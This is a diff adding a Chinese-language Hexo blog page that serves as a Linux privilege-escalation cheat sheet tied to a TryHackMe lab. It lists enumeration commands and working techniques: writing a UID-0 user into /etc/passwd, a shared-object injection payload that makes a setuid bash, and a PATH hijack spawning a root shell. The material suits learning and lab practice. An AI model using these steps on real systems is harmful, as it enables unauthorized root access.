@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文將會持續更新(大概) 当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。 练习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权方式">
+<meta property="og:url" content="http://atsud0.me/2020/04/14/Linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="本文將會持續更新(大概) 当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。 练习">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586775110961.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Linux_getsystem.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586769875679.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201127135304969.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200627_012227.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200627_012136.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200627_012712.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200511_110433.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/CVE-2019-18634-Demo-1.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200708_151735.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200623_162209.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200615_195603.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200712_215410.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20200909095740510.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20200909095753491.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20200909095818082.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201130100953041.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201130101625001.png">
+<meta property="article:published_time" content="2020-04-14T01:28:41.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.458Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="sudo">
+<meta property="article:tag" content="crontab">
+<meta property="article:tag" content="path">
+<meta property="article:tag" content="suid">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/image-1586775110961.png">
+
+<link rel="canonical" href="http://atsud0.me/2020/04/14/Linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Linux提权方式 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/04/14/Linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux提权方式
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-14 09:28:41" itemprop="dateCreated datePublished" datetime="2020-04-14T09:28:41+08:00">2020-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>26k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>24 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://images.atsud0.me/images/post/image-1586775110961.png" alt="file"><br><img src="https://images.atsud0.me/images/post/Linux_getsystem.png" alt=""></p>
+<p><del>本文將會持續更新(大概)</del></p>
+<p>当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。</p>
+<a href="https://tryhackme.com/room/linuxprivesc" title="" target="">练习</a>
+<a id="more"></a>
+
+<h2 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h2><p><img src="https://images.atsud0.me/images/post/image-1586769875679.png" alt="file"></p>
+<p>提权分为横向提权(Horizontal privilege)，纵向提权(Vertical privilege)。<br>横向提权：从user1继承user2的权限这样逐步提升权限，最后再提升到root。这是横向提权。<br>纵向提权：直接从user1跨越其他用户，直接提升到root用户。</p>
+<p>拿到webshell之后的起手式要做的动作</p>
+<h3 id="判断发行版"><a href="#判断发行版" class="headerlink" title="判断发行版"></a>判断发行版</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">cat &#x2F;etc&#x2F;*-release</span><br><span class="line">cat &#x2F;etc&#x2F;lsb-release      # Debian based</span><br><span class="line">cat &#x2F;etc&#x2F;redhat-release   # Redhat based</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断内核和系统位数"><a href="#判断内核和系统位数" class="headerlink" title="判断内核和系统位数"></a>判断内核和系统位数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls &#x2F;boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>
+
+<h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br><span class="line">ifconfig</span><br><span class="line">cat &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line">cat &#x2F;etc&#x2F;sysconfig&#x2F;network</span><br></pre></td></tr></table></figure>
+
+<h3 id="当前进程（最好看看root用户运行的进程"><a href="#当前进程（最好看看root用户运行的进程" class="headerlink" title="当前进程（最好看看root用户运行的进程"></a>当前进程（最好看看root用户运行的进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat &#x2F;etc&#x2F;services</span><br><span class="line"></span><br><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure>
+
+<h3 id="软件版本"><a href="#软件版本" class="headerlink" title="软件版本"></a>软件版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">ls -alh &#x2F;sbin&#x2F;</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archivesO</span><br><span class="line">ls -alh &#x2F;var&#x2F;cache&#x2F;yum&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="信息收集脚本"><a href="#信息收集脚本" class="headerlink" title="信息收集脚本"></a>信息收集脚本</h2><p>每次自动信息收集不累吗？来试试自动化信息收集脚本吧。下面的脚本有些无法在bash4.0以下运行（如LinPeas.sh)</p>
+<h3 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h3><p>LinEnum是用于枚举本机Linux系统上的各种信息，如服务信息，系统信息，用户等。</p>
+<p>下载:<a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank" rel="noopener">LinEnum</a></p>
+<h3 id="LinPEAS"><a href="#LinPEAS" class="headerlink" title="LinPEAS"></a>LinPEAS</h3><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" title="" target="">Linpeas</a>
+
+<h3 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux_Exploit_Suggester"></a>Linux_Exploit_Suggester</h3><p>漏洞利用建议</p>
+<ul>
+<li><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" title="" target="">Linux_Exploit_Suggester</a></li>
+<li><a href="https://github.com/jondonas/linux-exploit-suggester-2" title="" target="">Linux Exploit Suggester 2</a>
+
+</li>
+</ul>
+<h3 id="linuxprivchecker"><a href="#linuxprivchecker" class="headerlink" title="linuxprivchecker"></a>linuxprivchecker</h3><ul>
+<li><a href="https://github.com/sleventyeleven/linuxprivchecker" title="" target="">linuxprivchecker</a>
+
+
+</li>
+</ul>
+<h3 id="lse"><a href="#lse" class="headerlink" title="lse"></a>lse</h3><ul>
+<li><a href="https://github.com/diego-treitos/linux-smart-enumeration" title="" target="">lse</a>
+
+</li>
+</ul>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="配置文件信息泄露"><a href="#配置文件信息泄露" class="headerlink" title="配置文件信息泄露"></a>配置文件信息泄露</h3><p>有些服务的配置文件上面是明文写帐号密码的，一些不够严谨的系统管理员，会将部分服务的密码作为root用户的密码。</p>
+<h3 id="SSH-Key私钥泄露"><a href="#SSH-Key私钥泄露" class="headerlink" title="SSH-Key私钥泄露"></a>SSH-Key私钥泄露</h3><p>ssh十分重要的两个文件</p>
+<ul>
+<li>id_rsa</li>
+<li>id_rsa.pub</li>
+</ul>
+<p>id_rsa.pub会让攻击者知道你的公钥以及你的用户名<br>id_rsa则是记载私钥，攻击者获取私钥后，可暴力破解。如果私钥没有加密的话，攻击者可以直接使用私钥连接服务器。</p>
+<h3 id="openvpn"><a href="#openvpn" class="headerlink" title="openvpn"></a>openvpn</h3><ul>
+<li>*.ovpn (用户的连接配置文件)<br>有可能存在密钥信息或者是明文密码</li>
+<li>/etc/openvpn/auth.txt</li>
+<li>~/.irssi/config</li>
+</ul>
+<h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p>~/.bash_history</p>
+<p>这里也是找敏感信息的好地方~</p>
+<h3 id="vi-vim-swp"><a href="#vi-vim-swp" class="headerlink" title="vi/vim .swp"></a>vi/vim .swp</h3><p>vi/vim的恢复文件<code>.swp</code>里面有该文件的所有者的用户名，和路径信息。如果能在网站上找到这文件，或许你就能知道绝对路径和用户名了。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201127135304969.png" alt="image-20201127135304969"></p>
+<h3 id="网站CMS的config-php"><a href="#网站CMS的config-php" class="headerlink" title="网站CMS的config.php"></a>网站CMS的config.php</h3><p>位置不定，一般以config.php和inc.php之类的里面会写数据库连接的用户名和密码。</p>
+<h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><ul>
+<li>根目录/wordpress/admin/wp-config.php</li>
+<li>根目录/admin/wp-config.php</li>
+</ul>
+<h2 id="错误配置提权"><a href="#错误配置提权" class="headerlink" title="错误配置提权"></a>错误配置提权</h2><h3 id="错误配置-etc-passwd"><a href="#错误配置-etc-passwd" class="headerlink" title="错误配置 /etc/passwd"></a>错误配置 /etc/passwd</h3><p>什么是<code>/etc/passwd</code>，点击<a href="https://blog.csdn.net/a1154490629/article/details/52190801" target="_blank" rel="noopener">这里</a>了解</p>
+<p>如果某个用户具有<code>/etc/passwd</code>的写入权限的，那么我们可以使用这个用户，往<code>/etc/passwd</code>里面写入一个新的用户。（这不常见，一般/etc/passwd不会带有可写权限）<br>格式为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名:密码哈希:用户ID:组ID:备注:家目录:shell</span><br><span class="line">username:password hash:UID:GID:User ID Info:Home:command&#x2F;shell</span><br></pre></td></tr></table></figure>
+<p>所以如果我们要新建一个等同于root的新用户。要这么写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<p>要生成密码哈希值的话，需要用到<code>openssl</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt [new] [123]</span><br></pre></td></tr></table></figure>
+<p>-1是生成md5加密 new字段用户名，撒盐 123指密码</p>
+<p>然后直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>添加好后，虽然登陆是登陆new这个名字的用户，但是实际上是root用户，因为Linux下使用uid去识别的。</p>
+<h3 id="错误配置-etc-shadow"><a href="#错误配置-etc-shadow" class="headerlink" title="错误配置 /etc/shadow"></a>错误配置 /etc/shadow</h3><p><code>/etc/shadow</code>文件存储了用户的密码哈希加密字段。如果一个低权限用户能查看这个文件，那么就可以拿这个加密过得哈希值去暴力破解得到真实密码。</p>
+<h2 id="SUID位二进制文件提权"><a href="#SUID位二进制文件提权" class="headerlink" title="SUID位二进制文件提权"></a>SUID位二进制文件提权</h2><p>Linux系统中，会有部分命令的权限位是<code>rws</code>而不是<code>rwx</code>这些文件被称为SUID文件</p>
+<blockquote>
+<p>SUID 权限仅对二进制可执行文件有效，<br>如果执行者对于该二进制可执行文件具有x的权限，执行者将具有该文件的所有者的权限<br>本权限仅在执行该二进制可执行文件的过程中有效</p>
+</blockquote>
+<blockquote>
+<p>The setuid and setgid flags have an effect only on binary executable files and not on scripts (e.g., Bash, Perl, Python).</p>
+<p>setuid和setgid权限，只对二进制文件生效，对脚本文件不会生效。</p>
+</blockquote>
+<p>所以如果随意设置SUID文件，可能会导致系统很危险。<br>SGID文件同理，只不过SGID,是执行者将具有该文件的所有组权限。</p>
+<p>而SBIT权限只对目录有效，SBIT对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p>
+<p>总结一下:</p>
+<ul>
+<li>SUID,执行者将具有owner的权限</li>
+<li>SGID,执行者将具有group的权限</li>
+<li>SGIT,目录属性下用户新建的文件或目录,只有owner和root才能删除</li>
+<li>SUID和SGID只有</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p>这里有更多的信息：<a href="https://www.cnblogs.com/sparkdev/p/9651622.html" target="_blank" rel="noopener">SUID</a><br>这里有一个SUID提权的实例：<a href="/2020/04/14/TryHackMe-Kenobi/">kenobi</a></p>
+<h3 id="SUID-exim-CVE-2016-1531-提权"><a href="#SUID-exim-CVE-2016-1531-提权" class="headerlink" title="SUID-exim-CVE-2016-1531 提权"></a>SUID-exim-CVE-2016-1531 提权</h3><p>exim &lt;= 4.84-3</p>
+<a href="https://www.exploit-db.com/exploits/39535" title="" target="">exploit利用</a>
+
+<h3 id="SUID-nginx-CVE-2016-1247-提权"><a href="#SUID-nginx-CVE-2016-1247-提权" class="headerlink" title="SUID nginx CVE-2016-1247 提权"></a>SUID nginx CVE-2016-1247 提权</h3><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">漏洞信息和EXP</a></p>
+<p>要求:</p>
+<ul>
+<li>拿到www-data用户权限</li>
+<li>nginx &lt; 1.10.2-r3</li>
+</ul>
+<p>执行exp后</p>
+<p>等待第二天6点工作排程更新。获取root权限</p>
+<h3 id="SUID-suid-so-共享对象库注入"><a href="#SUID-suid-so-共享对象库注入" class="headerlink" title="SUID suid-so 共享对象库注入"></a>SUID suid-so 共享对象库注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -04000 -ls 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012227.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-so 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012136.jpg" alt=""></p>
+<p>可以看到有一个链接库文件在家目录的.config下，是我们可以利用的，所以。</p>
+<p>在<code>~/.config</code>目录下创建一个libcalc.c文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">void inject() &#123;</span><br><span class="line">    system(&quot;cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash &amp;&amp; &#x2F;tmp&#x2F;bash -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o &#x2F;home&#x2F;user&#x2F;.config&#x2F;libcalc.so -fPIC &#x2F;home&#x2F;user&#x2F;.config&#x2F;libcalc.c</span><br></pre></td></tr></table></figure>
+
+<p>然后执行suid-so文件。就提权了</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012712.jpg" alt=""></p>
+<h3 id="SUID-env提权"><a href="#SUID-env提权" class="headerlink" title="SUID env提权"></a>SUID env提权</h3><p>假设有以下两个文件suid-env,suid-env2。这两个文件具有suid位权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">TCM@debian:~&#x2F;.config$ strings &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env</span><br><span class="line">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2</span><br><span class="line">5q;Xq</span><br><span class="line">__gmon_start__</span><br><span class="line">libc.so.6</span><br><span class="line">setresgid</span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line">l$ L</span><br><span class="line">t$(L</span><br><span class="line">|$0H</span><br><span class="line">service apache2 start</span><br><span class="line">TCM@debian:~&#x2F;.config$ strings &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2</span><br><span class="line">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2</span><br><span class="line">__gmon_start__</span><br><span class="line">libc.so.6</span><br><span class="line">setresgid</span><br><span class="line">setresuid</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">fff.</span><br><span class="line">fffff.</span><br><span class="line">l$ L</span><br><span class="line">t$(L</span><br><span class="line">|$0H</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;service apache2 start</span><br></pre></td></tr></table></figure>
+
+<p>用strings能够看到最后执行的语句是</p>
+<ul>
+<li>service apache2 start</li>
+<li>/usr/sbin/service apache2 start</li>
+</ul>
+<h4 id="第一种没有绝对路径的service"><a href="#第一种没有绝对路径的service" class="headerlink" title="第一种没有绝对路径的service"></a>第一种没有绝对路径的service</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;int main() &#123; setgid(0); setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;&#39; &gt; &#x2F;tmp&#x2F;service.c</span><br><span class="line">gcc &#x2F;tmp&#x2F;service.c -o &#x2F;tmp&#x2F;service</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env</span><br></pre></td></tr></table></figure>
+
